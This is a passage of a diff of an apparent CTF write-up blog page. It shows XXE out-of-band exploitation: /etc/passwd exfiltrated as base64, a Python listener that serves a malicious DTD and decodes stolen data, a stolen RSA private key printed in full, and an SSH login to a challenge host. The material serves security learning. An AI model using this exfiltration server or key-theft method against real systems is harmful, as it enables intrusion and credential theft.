6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg== HTTP/1.0&#34; 200 -
 </code></pre><p>So now, I think you are pro base64 decoder :p</p>
-<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ echo &quot;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg==&quot; | base64 -d
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ echo &#34;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg==&#34; | base64 -d
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -659,56 +658,56 @@ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/bin/false
 </code></pre><p>Here is a nice python http server to gather our data to automate extraction task. Don&rsquo;t forget to grab a copy of <code>exploit.dtd</code> and <code>ticket.xml</code> (see above).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
-<span style="color:#f92672">from</span> BaseHTTPServer <span style="color:#f92672">import</span> BaseHTTPRequestHandler,HTTPServer
-<span style="color:#f92672">import</span> urlparse<span style="color:#f92672">,</span> base64<span style="color:#f92672">,</span> os
-
-<span style="color:#75715e"># Listening port</span>
-PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">4444</span>
-
-<span style="color:#75715e"># Class to handle HTTP request</span>
-<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Handler</span>(BaseHTTPRequestHandler):
-
-	<span style="color:#75715e"># Handler for GET requests</span>
-	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_GET</span>(self):
-		query <span style="color:#f92672">=</span> urlparse<span style="color:#f92672">.</span>urlparse(self<span style="color:#f92672">.</span>path)<span style="color:#f92672">.</span>query
-		file <span style="color:#f92672">=</span> urlparse<span style="color:#f92672">.</span>urlparse(self<span style="color:#f92672">.</span>path)<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
-
-		<span style="color:#75715e"># If the victim server load our malicious file -&gt; send it</span>
-		<span style="color:#66d9ef">if</span> file:
-			<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(file):
-				f <span style="color:#f92672">=</span> open(file, <span style="color:#e6db74">&#39;r&#39;</span>)
-				self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
-				self<span style="color:#f92672">.</span>end_headers()
-				self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(f<span style="color:#f92672">.</span>read())
-				f<span style="color:#f92672">.</span>close()
-			<span style="color:#66d9ef">else</span>:
-				self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">404</span>)
-				self<span style="color:#f92672">.</span>end_headers()
-				self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;404 ERROR : File not found !&#34;</span>)
-
-		<span style="color:#75715e"># Else if, the victim server send us data -&gt; decode it</span>
-		<span style="color:#66d9ef">else</span>:
-			b64data <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;data=&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
-			plaintext <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b64data)
-			os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;clear&#34;</span>)
-			print <span style="color:#e6db74">&#34;[+] Data received !&#34;</span>
-			print plaintext
-
-<span style="color:#66d9ef">try</span>:
-	<span style="color:#75715e"># Create the web server</span>
-	server <span style="color:#f92672">=</span> HTTPServer((<span style="color:#e6db74">&#39;&#39;</span>, PORT), Handler)
-	print <span style="color:#e6db74">&#39;[*] Listening on port&#39;</span> , PORT
-
-	<span style="color:#75715e"># Wait forever for incoming HTTP requests</span>
-	server<span style="color:#f92672">.</span>serve_forever()
-
-<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
-	print <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[x] Shutting down the web server&#39;</span>
-	server<span style="color:#f92672">.</span>socket<span style="color:#f92672">.</span>close()
-</code></pre></div><p>Demo :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> BaseHTTPServer <span style="color:#f92672">import</span> BaseHTTPRequestHandler,HTTPServer
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urlparse<span style="color:#f92672">,</span> base64<span style="color:#f92672">,</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Listening port</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Class to handle HTTP request</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Handler</span>(BaseHTTPRequestHandler):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Handler for GET requests</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_GET</span>(self):
+</span></span><span style="display:flex;"><span>		query <span style="color:#f92672">=</span> urlparse<span style="color:#f92672">.</span>urlparse(self<span style="color:#f92672">.</span>path)<span style="color:#f92672">.</span>query
+</span></span><span style="display:flex;"><span>		file <span style="color:#f92672">=</span> urlparse<span style="color:#f92672">.</span>urlparse(self<span style="color:#f92672">.</span>path)<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># If the victim server load our malicious file -&gt; send it</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> file:
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(file):
+</span></span><span style="display:flex;"><span>				f <span style="color:#f92672">=</span> open(file, <span style="color:#e6db74">&#39;r&#39;</span>)
+</span></span><span style="display:flex;"><span>				self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
+</span></span><span style="display:flex;"><span>				self<span style="color:#f92672">.</span>end_headers()
+</span></span><span style="display:flex;"><span>				self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(f<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>				f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>				self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">404</span>)
+</span></span><span style="display:flex;"><span>				self<span style="color:#f92672">.</span>end_headers()
+</span></span><span style="display:flex;"><span>				self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;404 ERROR : File not found !&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Else if, the victim server send us data -&gt; decode it</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			b64data <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;data=&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>			plaintext <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b64data)
+</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;clear&#34;</span>)
+</span></span><span style="display:flex;"><span>			print <span style="color:#e6db74">&#34;[+] Data received !&#34;</span>
+</span></span><span style="display:flex;"><span>			print plaintext
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Create the web server</span>
+</span></span><span style="display:flex;"><span>	server <span style="color:#f92672">=</span> HTTPServer((<span style="color:#e6db74">&#39;&#39;</span>, PORT), Handler)
+</span></span><span style="display:flex;"><span>	print <span style="color:#e6db74">&#39;[*] Listening on port&#39;</span> , PORT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Wait forever for incoming HTTP requests</span>
+</span></span><span style="display:flex;"><span>	server<span style="color:#f92672">.</span>serve_forever()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
+</span></span><span style="display:flex;"><span>	print <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[x] Shutting down the web server&#39;</span>
+</span></span><span style="display:flex;"><span>	server<span style="color:#f92672">.</span>socket<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>Demo :</p>
 <p><img src="/img/santhacklaus/archdrive1.gif" alt=""></p>
-<p>So now we can read server files. Now the real question is : <strong><em>&ldquo;Ok thanks but what am I supposed to find ?&quot;</em></strong>. This is a huge question. In my little ctf experience, is always the same things : ssh key, script, config (ssh, apache, nginx, etc&hellip;)</p>
+<p>So now we can read server files. Now the real question is : <strong><em>&ldquo;Ok thanks but what am I supposed to find ?&rdquo;</em></strong>. This is a huge question. In my little ctf experience, is always the same things : ssh key, script, config (ssh, apache, nginx, etc&hellip;)</p>
 <div class="alert protips">
     <i class="logo fas fa-hand-holding-heart"></i>
     <p class="text"><strong>ProTips</strong> : When you are in front of a LFI or something else who permit you to read files, I recommend you to be meticulous in you search with a cheatsheet (thanks captain obvious). The anwser will always in the cheatsheet ! 
@@ -716,93 +715,92 @@ PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">4444</span
     </p>
 </div>
 <p>So navigate to this wonderful cheatsheet : <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a> and start try to read some files. Why not check ssh server config (/etc/ssh/sshd_config)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">### SSH configuration file ###</span>
-
-<span style="color:#75715e"># General</span>
-Port <span style="color:#ae81ff">2020</span>
-Protocol <span style="color:#ae81ff">2</span>
-AcceptEnv LANG LC_*
-Banner /etc/banner
-
-<span style="color:#75715e"># Allow users</span>
-AllowUsers dark_lottery
-
-<span style="color:#75715e"># Authentification</span>
-PermitRootLogin no
-PubkeyAuthentication yes
-StrictModes yes
-PermitEmptyPasswords no
-LoginGraceTime 20s
-MaxAuthTries <span style="color:#ae81ff">5</span>
-MaxStartups <span style="color:#ae81ff">100</span>
-AuthenticationMethods publickey
-
-<span style="color:#75715e">#Forwarding</span>
-AllowTcpForwarding no
-X11Forwarding no
-AllowStreamLocalForwarding no
-GatewayPorts no
-PermitTunnel no
-
-<span style="color:#75715e"># Desactivate other auth methodes</span>
-PasswordAuthentication no
-KerberosAuthentication no
-GSSAPIAuthentication no
-usePam no
-</code></pre></div><p>Ho ! There is some interesting informations here :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">### SSH configuration file ###</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># General</span>
+</span></span><span style="display:flex;"><span>Port <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>Protocol <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>AcceptEnv LANG LC_*
+</span></span><span style="display:flex;"><span>Banner /etc/banner
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allow users</span>
+</span></span><span style="display:flex;"><span>AllowUsers dark_lottery
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Authentification</span>
+</span></span><span style="display:flex;"><span>PermitRootLogin no
+</span></span><span style="display:flex;"><span>PubkeyAuthentication yes
+</span></span><span style="display:flex;"><span>StrictModes yes
+</span></span><span style="display:flex;"><span>PermitEmptyPasswords no
+</span></span><span style="display:flex;"><span>LoginGraceTime 20s
+</span></span><span style="display:flex;"><span>MaxAuthTries <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>MaxStartups <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>AuthenticationMethods publickey
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Forwarding</span>
+</span></span><span style="display:flex;"><span>AllowTcpForwarding no
+</span></span><span style="display:flex;"><span>X11Forwarding no
+</span></span><span style="display:flex;"><span>AllowStreamLocalForwarding no
+</span></span><span style="display:flex;"><span>GatewayPorts no
+</span></span><span style="display:flex;"><span>PermitTunnel no
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Desactivate other auth methodes</span>
+</span></span><span style="display:flex;"><span>PasswordAuthentication no
+</span></span><span style="display:flex;"><span>KerberosAuthentication no
+</span></span><span style="display:flex;"><span>GSSAPIAuthentication no
+</span></span><span style="display:flex;"><span>usePam no
+</span></span></code></pre></div><p>Ho ! There is some interesting informations here :</p>
 <ul>
 <li>A ssh service is running on port 2020 (no need nmap dude !)</li>
 <li>Only one user is authorized ton log on : <code>dark_lottery</code></li>
 <li>The user <code>dark_lottery</code> can only connect with a private key</li>
 </ul>
 <p>So ?! What do you think ? Why not try to steal this ssh private key ? Im sur the key is here ! But where ? Why not to try the default location of the public key readable by all : <code>/home/dark_lottery/.ssh/id_rsa.pub</code></p>
-<pre tabindex="0"><code>
-</code></pre><p>Nothing&hellip; Hum strange&hellip; Try to read the private key. By default, the private key is only readable by is owner.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-----BEGIN RSA PRIVATE KEY-----
-MIICXQIBAAKBgQC3e6s3ZeRV/lgTltFgmVLB/LBYtzRBSpQUEt/1g/MsMidRhdBw
-W0kDlgchsVHL6kGt26JtHVr04MdFSeCUHiSJVuuqDiEPae+98l4LOWWg2dXwKsIv
-x6qDobCyGNi7HzmkxNTh+NxLq+aIsjk/gw38HtNkZAqwokySDcZhgwHFawIDAQAB
-AoGAQqB/vfAcCDYB2assgL1sVdDiYHS2Xvcr6lYoSUkO5n+X03yaAhLD4q96C3wO
-TdPU4cMdqi28t6tf8QMwr9h6P1+M7CDTsyBQbR7bvm88yzGNBuE9P3oBiKu24+x0
-lPL1TORpHxGOersUz3eH2+hdnGs3xDYNSk8RoUY6ckCv3AECQQDbdwhuvDo+cnkN
-xupfdvSRTfXH05fosfvim6/yvw0ZeyxyAzXE5/KclpNCXzW70JrVI4huXjk5TD7l
-R019nJprAkEA1gcw48pAjFSc6oTexR1ayHQYGFGSx7PvXi+VJHAyFTXP4+l+pk72
-qFlrT4tYMiZqbCws9qAthpsTBnauspBBAQJBAMWOwn2EXV3niEc5n7NuDrxalHxc
-YivrRFZ6VYnMJ8ufUKQVdaqaLZB+D3O451L5dteU0/SeRx7oHtogNIZ1mZ8CQAYp
-mNfGOAuSWB5MixmD2dxRs2vn1WEYpjjBB/tPm7GOphi63WGufl2kjXlx2q0+++t3
-bif/vq/UgTy7aBZOHwECQQC4jty8EX0KdvylXIRzhCK7XvHze+GXHFptaB1wf+Wr
-LAKwqo3/gOiPe8w5CRUWuDfuy04a81OBEF3Gv2pyVctg
------END RSA PRIVATE KEY-----
-</code></pre></div><p>We can now connect to the server with user <code>dark_lottery</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc ~<span style="color:#f92672">]</span>$ ssh dark_lottery@51.75.202.113 -p <span style="color:#ae81ff">2020</span> -i key
-
-    ___           _        __       _   _
-   /   <span style="color:#ae81ff">\_</span>_ _ _ __| | __   / /  ___ | |_| |_ ___ _ __ _   _
-  / /<span style="color:#ae81ff">\ </span>/ _<span style="color:#e6db74">`</span> | <span style="color:#e6db74">&#39;__| |/ /  / /  / _ \| __| __/ _ \ &#39;</span>__| | | |
- / /_// <span style="color:#f92672">(</span>_| | |  |   &lt;  / /__| <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span> | |_| <span style="color:#f92672">||</span>  __/ |  | |_| |
-/___,<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#ae81ff">\_</span>_,_|_|  |_|<span style="color:#ae81ff">\_\ \_</span>___/<span style="color:#ae81ff">\_</span>__/ <span style="color:#ae81ff">\_</span>_|<span style="color:#ae81ff">\_</span>_<span style="color:#ae81ff">\_</span>__|_|   <span style="color:#ae81ff">\_</span>_, |
-                                                      |___/
-Last login: Fri Dec <span style="color:#ae81ff">28</span> 16:58:26 <span style="color:#ae81ff">2018</span> from 81.57.217.252
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-dark_lottery@9db68003fdde:~$
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dark_lottery@9db68003fdde:~$ ls -al
-total <span style="color:#ae81ff">28</span>
-dr-xr-x--- <span style="color:#ae81ff">1</span> root dark_lottery <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 18:27 .
-drwxr-xr-x <span style="color:#ae81ff">1</span> root root         <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 18:27 ..
--r-xr-x--- <span style="color:#ae81ff">1</span> root dark_lottery  <span style="color:#ae81ff">220</span> Dec <span style="color:#ae81ff">20</span> 18:27 .bash_logout
--r-xr-x--- <span style="color:#ae81ff">1</span> root dark_lottery <span style="color:#ae81ff">3526</span> Dec <span style="color:#ae81ff">20</span> 18:27 .bashrc
--r-xr-x--- <span style="color:#ae81ff">1</span> root dark_lottery  <span style="color:#ae81ff">675</span> Dec <span style="color:#ae81ff">20</span> 18:27 .profile
-drwxr-x--- <span style="color:#ae81ff">1</span> root dark_lottery <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 18:27 .ssh
--r--r--r-- <span style="color:#ae81ff">1</span> root root           <span style="color:#ae81ff">29</span> Dec <span style="color:#ae81ff">20</span> 18:24 flag.txt
-dark_lottery@9db68003fdde:~$ cat flag.txt
-IMTLD<span style="color:#f92672">{</span>Wh4t_4_H4rD_ch4lL3nge<span style="color:#f92672">}</span>
-</code></pre></div><p>Only one step is remaining !</p>
+<pre tabindex="0"><code></code></pre><p>Nothing&hellip; Hum strange&hellip; Try to read the private key. By default, the private key is only readable by is owner.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>MIICXQIBAAKBgQC3e6s3ZeRV/lgTltFgmVLB/LBYtzRBSpQUEt/1g/MsMidRhdBw
+</span></span><span style="display:flex;"><span>W0kDlgchsVHL6kGt26JtHVr04MdFSeCUHiSJVuuqDiEPae+98l4LOWWg2dXwKsIv
+</span></span><span style="display:flex;"><span>x6qDobCyGNi7HzmkxNTh+NxLq+aIsjk/gw38HtNkZAqwokySDcZhgwHFawIDAQAB
+</span></span><span style="display:flex;"><span>AoGAQqB/vfAcCDYB2assgL1sVdDiYHS2Xvcr6lYoSUkO5n+X03yaAhLD4q96C3wO
+</span></span><span style="display:flex;"><span>TdPU4cMdqi28t6tf8QMwr9h6P1+M7CDTsyBQbR7bvm88yzGNBuE9P3oBiKu24+x0
+</span></span><span style="display:flex;"><span>lPL1TORpHxGOersUz3eH2+hdnGs3xDYNSk8RoUY6ckCv3AECQQDbdwhuvDo+cnkN
+</span></span><span style="display:flex;"><span>xupfdvSRTfXH05fosfvim6/yvw0ZeyxyAzXE5/KclpNCXzW70JrVI4huXjk5TD7l
+</span></span><span style="display:flex;"><span>R019nJprAkEA1gcw48pAjFSc6oTexR1ayHQYGFGSx7PvXi+VJHAyFTXP4+l+pk72
+</span></span><span style="display:flex;"><span>qFlrT4tYMiZqbCws9qAthpsTBnauspBBAQJBAMWOwn2EXV3niEc5n7NuDrxalHxc
+</span></span><span style="display:flex;"><span>YivrRFZ6VYnMJ8ufUKQVdaqaLZB+D3O451L5dteU0/SeRx7oHtogNIZ1mZ8CQAYp
+</span></span><span style="display:flex;"><span>mNfGOAuSWB5MixmD2dxRs2vn1WEYpjjBB/tPm7GOphi63WGufl2kjXlx2q0+++t3
+</span></span><span style="display:flex;"><span>bif/vq/UgTy7aBZOHwECQQC4jty8EX0KdvylXIRzhCK7XvHze+GXHFptaB1wf+Wr
+</span></span><span style="display:flex;"><span>LAKwqo3/gOiPe8w5CRUWuDfuy04a81OBEF3Gv2pyVctg
+</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
+</span></span></code></pre></div><p>We can now connect to the server with user <code>dark_lottery</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc ~<span style="color:#f92672">]</span>$ ssh dark_lottery@51.75.202.113 -p <span style="color:#ae81ff">2020</span> -i key
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ___           _        __       _   _
+</span></span><span style="display:flex;"><span>   /   <span style="color:#ae81ff">\_</span>_ _ _ __| | __   / /  ___ | |_| |_ ___ _ __ _   _
+</span></span><span style="display:flex;"><span>  / /<span style="color:#ae81ff">\ </span>/ _<span style="color:#e6db74">`</span> | <span style="color:#e6db74">&#39;__| |/ /  / /  / _ \| __| __/ _ \ &#39;</span>__| | | |
+</span></span><span style="display:flex;"><span> / /_// <span style="color:#f92672">(</span>_| | |  |   &lt;  / /__| <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span> | |_| <span style="color:#f92672">||</span>  __/ |  | |_| |
+</span></span><span style="display:flex;"><span>/___,<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#ae81ff">\_</span>_,_|_|  |_|<span style="color:#ae81ff">\_\ \_</span>___/<span style="color:#ae81ff">\_</span>__/ <span style="color:#ae81ff">\_</span>_|<span style="color:#ae81ff">\_</span>_<span style="color:#ae81ff">\_</span>__|_|   <span style="color:#ae81ff">\_</span>_, |
+</span></span><span style="display:flex;"><span>                                                      |___/
+</span></span><span style="display:flex;"><span>Last login: Fri Dec <span style="color:#ae81ff">28</span> 16:58:26 <span style="color:#ae81ff">2018</span> from 81.57.217.252
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>dark_lottery@9db68003fdde:~$
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dark_lottery@9db68003fdde:~$ ls -al
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">28</span>
